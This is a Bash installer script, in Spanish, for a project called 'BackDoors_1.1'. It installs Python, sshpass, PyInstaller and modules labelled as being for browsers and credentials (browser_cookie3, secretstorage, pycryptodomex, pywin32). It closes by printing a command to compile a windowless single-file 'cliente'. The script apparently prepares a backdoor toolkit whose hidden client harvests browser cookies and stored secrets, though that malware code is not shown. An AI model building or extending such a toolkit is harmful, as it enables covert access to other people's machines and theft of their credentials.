#!/bin/bash

echo "============ Instalador de BackDoors_1.1 ============"

echo "[*] Actualizando paquetes del sistema..."
sudo apt update -y
sudo apt upgrade -y

echo "[*] Instalando dependencias de Python..."
sudo apt install -y python3 python3-pip python3-tk python3-xlib sshpass

echo "[*] Instalando requirements del proyecto..."
pip3 install --upgrade pip
pip3 install -r requirements.txt

echo "[*] Instalando PyInstaller para compilación de cliente..."
pip3 install pyinstaller

echo "[*] Instalando módulos avanzados para navegadores y credenciales..."
pip3 install browser_cookie3 pywin32 pycryptodomex secretstorage

echo "[*] Instalación completada."

echo "Recuerda: Para compilar el cliente usa:"
echo "pyinstaller --onefile --noconsole --add-data \"core:core\" --add-data \"modules:modules\" cliente/main.py"

echo "=============================================="
